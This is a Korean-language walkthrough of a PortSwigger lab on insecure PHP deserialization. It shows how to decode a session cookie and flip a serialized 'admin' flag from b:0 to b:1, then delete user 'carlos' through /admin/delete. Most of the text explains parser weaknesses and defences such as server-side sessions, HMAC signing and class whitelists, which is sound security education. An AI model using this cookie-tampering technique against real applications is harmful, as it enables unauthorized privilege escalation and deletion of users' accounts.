# Lab: Modifying serialized objects

## 개요

- **난이도**: Apprentice
- **주제**: Insecure Deserialization — PHP 직렬화 세션 / 직렬화 객체 조작 / 권한 상승(Privilege Escalation)
- **링크**: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects

## 목표

로그인 후 발급되는 **세션 쿠키의 직렬화 객체를 수정**해 관리자 권한을 얻고, 사용자 `carlos` 를 삭제한다.

- 계정: `wiener:peter`

## 배경 개념 — 직렬화 / 역직렬화

```
[직렬화(Serialization)]
  메모리 상의 객체/자료구조를 저장·전송 가능한 바이트 스트림(문자열)으로 변환
  예) 세션 저장, 쿠키, 캐시, 메시지 큐, RMI/RPC ...

[역직렬화(Deserialization)]
  바이트 스트림을 다시 원래 객체/자료구조로 복원
  → 이 복원 과정에서 "데이터" 가 아닌 "코드/동작" 이 실행될 수 있어 위험

[핵심]
  역직렬화 취약점의 본질은 "신뢰할 수 없는 입력으로 객체를 복원" 하는 것.
  복원 시점에 개발자가 의도하지 않은 속성/타입/클래스가 만들어질 수 있다.
```

## PHP 직렬화 포맷

이 랩의 세션 쿠키는 PHP 직렬화 객체가 Base64(+URL 인코딩)된 형태다.

```
[타입 지정자]
  N;            null
  b:0; / b:1;   boolean
  i:123;        integer
  d:1.5;        double(float)
  s:6:"wiener"; string   ← 길이는 "바이트 수"
  a:2:{...}     array    ← 숫자는 원소 개수
  O:4:"User":2:{...}     ← 객체: 클래스명 길이, 속성 개수
```

예시 — 이 랩의 세션에 담긴 객체(개념도):

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

```
O:4:"User"   클래스명 "User" (4글자)
:2:          속성 2개
{ ... }      속성명/값 쌍
  s:8:"username"; s:6:"wiener";
  s:5:"admin";    b:0;            ← admin = false (boolean)
```

```
[쿠키 인코딩]
  위 문자열 → Base64 → URL 인코딩 → 쿠키 값
  Burp Inspector 는 자동으로 디코딩해 텍스트 객체로 보여주고,
  수정하면 다시 인코딩해 요청에 반영한다.
```

## 취약 지점

```
[근본 원인]
  1) 세션 상태(그리고 인가 여부)를 클라이언트 쿠키에 "직렬화 객체" 로 저장
  2) 서버가 그 객체를 그대로 역직렬화해 신뢰
  3) 무결성 검증(서명/HMAC)이나 타입 제약이 없음

[결과]
  공격자가 admin 속성을 b:0 → b:1 로 바꾸면 서버가 그대로 믿고 관리자로 취급
  → 클라이언트가 조작 가능한 값으로 "인가" 를 판단하는 전형적 결함
```

## 공격 단계

### 1단계 — 로그인 및 세션 쿠키 확인

`wiener:peter` 로 로그인 후, 로그인 이후의 `GET /my-account` 요청을 관찰한다.
세션 쿠키가 URL + Base64 인코딩된 형태로 보인다.

```
Cookie: session=Base64로_인코딩된_직렬화_객체
```

### 2단계 — Burp Inspector 로 디코딩

Inspector 패널로 쿠키를 디코딩해 **PHP 직렬화 객체**임을 확인한다.
`admin` 속성이 `b:0` (false) 인 것을 확인하고 Repeater 로 전송한다.

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

### 3단계 — admin 값을 true 로 수정

Inspector 에서 `admin` 값을 `b:1` 로 바꾼다. "Apply changes" 를 누르면
수정된 객체가 자동으로 재인코딩되어 요청에 반영된다.

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

> 주의: 문자열 길이(`s:5:"admin"`)는 그대로 두고 **불리언 값만** 바꾼다.
> 길이를 잘못 건드리면 파서가 객체를 복원하지 못한다. (아래 "파싱 관점" 참고)

### 4단계 — 관리자 페이지 접근

요청을 보내면 응답에 `/admin` 링크가 나타난다 → 관리자 권한으로 접근 성공.

### 5단계 — carlos 삭제

경로를 `/admin/delete?username=carlos` 로 바꿔 전송 → 랩 해결.

```
GET /admin/delete?username=carlos HTTP/1.1
Cookie: session=<수정된 직렬화 객체>
```

## 직렬화 객체 파싱 — 방어 관점 조사

> "왜 텍스트를 조금 바꾸는 것만으로 권한 상승이 되는가" 를 파서(parser) 관점에서 정리한다.

### 1. PHP 파서는 "선언된 길이" 를 신뢰한다

PHP 의 `unserialize()` 는 토큰 기반 스트림 파서다. 문자열은 `s:길이:"값";` 처럼
**길이가 먼저 선언**되고, 파서는 그 길이만큼 읽어 값을 채운다.

```
s:5:"admin";   → 5 바이트를 속성명으로 소비
b:0;           → boolean false

[방어적 시사점]
  - 길이와 실제 값이 어긋나면 파싱이 중단되거나 뒤쪽 토큰이 밀려 해석된다.
  - 그래서 값만 바꾸되 길이를 유지해야 하는 것.
  - 파서가 "선언을 그대로 믿는다" 는 점 자체가 공격면이다.
```

### 2. 타입 지정자를 바꾸는 것만으로 우회가 가능하다 (Type Juggling)

속성의 **값**뿐 아니라 **타입**도 클라이언트가 정한다.

```
[예 — 느슨한 비교를 노리는 변조]
  원본:  s:1:"0";      (문자열 "0")
  변조:  i:0;          (정수 0)
  또는   b:0;          (false)

  애플리케이션이 if ($user->admin)          → b:1 이면 통과
  애플리케이션이 if ($user->admin == true)  → PHP 느슨한 비교에서 "0", "" 등이 false

[시사점]
  직렬화 데이터를 역직렬화한 뒤의 비교는 반드시 "타입까지 엄격하게" 해야 한다.
  (PHP: === / !==, 그리고 복원 단계에서 타입 화이트리스트 적용)
```

### 3. 객체 속성 가시성(public/protected/private)이 직렬화에 그대로 드러난다

```
[PHP 객체 속성의 직렬화 표현]
  public    admin        → s:5:"admin";
  protected admin        → s:8:"\0*\0admin";        (\0*\0 = 3바이트 접두)
  private   admin        → s:13:"\0User\0admin";    (클래스명 포함)

[시사점]
  속성명에 NUL 바이트와 클래스명이 섞여 들어간다.
  입력 검증/필터가 NUL 바이트를 놓치거나 잘라내면 파싱이 어긋난다.
  즉 "사용자 입력을 직렬화 포맷으로 다루는 것" 자체가 파싱 지뢰밭이다.
```

### 4. 역직렬화 시 매직 메서드가 자동 호출된다

```
[PHP 매직 메서드]
  __wakeup()      → unserialize() 복원 직후 자동 호출
  __unserialize() → PHP 7.4+ 에서 __wakeup 대체
  __destruct()    → 객체 소멸(스크립트 종료 등) 시 자동 호출
  __toString()    → 객체가 문자열로 쓰일 때 호출
  __construct()   → unserialize 시에는 "호출되지 않음"  ← 오해 주의

[공격 체인(Gadget Chain)의 씨앗]
  공격자는 악성 코드를 직접 넣지 않는다.
  이미 존재하는 클래스들의 매직 메서드 호출 순서를 엮어
  파일 쓰기/명령 실행 같은 "sink" 에 도달한다.
  → 이 랩(001)은 가장 단순한 형태로, 매직 메서드 없이 속성값만 변조한 케이스다.
```

### 5. references / custom object 등 파서의 추가 문법

```
  R:n; / r:n;   이전 원소의 참조
  C:길이:"Class":길이:{...}   Serializable 인터페이스 구현 객체

[시사점]
  참조를 이용하면 한 속성을 바꿔 다른 속성에 영향(aliasing)을 줄 수 있다.
  파서가 지원하는 문법이 넓을수록 공격면도 넓다.
```

## 방어

```
[근본 원칙]
  신뢰할 수 없는 입력을 직렬화 포맷으로 받지 않는다.
  = "사용자 입력 → 역직렬화" 경로를 만들지 않는다.

[구체적 방어]
  1. 서버 측 세션 사용
     - 인가 여부(admin) 등 권위 있는 상태는 서버 저장소에만 둔다.
     - 쿠키에는 의미 없는 세션 ID만 담고, 매 요청 서버에서 조회한다.
     - 쿠키에 객체를 직렬화해 넣지 않는다 (이 랩의 근본 원인).

  2. 직렬화 데이터가 꼭 필요하면 무결성을 보증한다
     - 서버 비밀키로 HMAC/전자서명 → 변조 시 역직렬화 거부.
     - 가능하면 암호화(기밀성) + 서명(무결성)을 함께.

  3. 안전한 데이터 포맷 사용
     - 직렬화 대신 JSON/XML 등 "데이터 전용" 포맷 + 엄격한 스키마 검증.
     - 포맷 파서가 코드를 실행하지 않도록.

  4. 역직렬화 자체를 제한 (PHP)
     - unserialize($data, ['allowed_classes' => false])
       또는 허용 클래스만 화이트리스트로 지정.
     - 신뢰 경계 밖 데이터는 절대 허용 클래스 자동 로드 경로에 태우지 않는다.

  5. 엄격한 타입 검사
     - 복원된 값의 타입/범위를 화이트리스트로 검증.
     - 권한 비교는 === 등 엄격 비교, loose comparison 금지.

  6. 공급망/의존성 관리
     - gadget chain 은 라이브러리 클래스 조합으로 만들어진다.
     - 의존성 최신 유지 + 불필요한 클래스/오토로딩 노출 최소화.

  7. 역직렬화 코드 격리
     - 저권한 프로세스/컨테이너에서 수행, 파일/네트워크 권한 최소화.
```

## 핵심 정리

- 세션 쿠키가 PHP 직렬화 객체를 담고 있었고, 서버가 이를 무결성 검증 없이 역직렬화해 인가에 사용했다.
- `admin` 속성을 `b:0` → `b:1` 로 바꾸는 것만으로 관리자 권한을 얻어 `carlos` 를 삭제했다.
- 직렬화 포맷은 텍스트 기반이라 사람이 읽고 수정할 수 있으며, 파서는 선언된 길이/타입/클래스명을 그대로 신뢰한다.
- 근본 원인은 "클라이언트가 조작 가능한 직렬화 데이터로 인가 상태를 판단" 한 것이며, 방어의 핵심은 서버 측 세션 + 무결성 보증 + 안전한 데이터 포맷이다.

## 배운 점

- 역직렬화 취약점은 "데이터를 조작한다" 는 감각보다 "객체 복원 과정 자체가 공격면" 이라는 관점으로 봐야 한다.
- PHP 직렬화 포맷은 `b:`/`i:`/`s:`/`a:`/`O:` 같은 타입 지정자와 길이 접두어로 구성되며, 이 문법을 이해하면 변조 지점이 보인다.
- 파싱 관점의 위험 요소: 선언된 길이 신뢰, 타입 저글링, 속성 가시성(NUL/클래스명), 매직 메서드 자동 호출, 참조/커스텀 객체 문법.
- 방어의 1순위는 "신뢰할 수 없는 입력을 역직렬화하지 않기" 이고, 차선은 서명/화이트리스트/엄격 타입 검사 + 서버 측 세션이다.
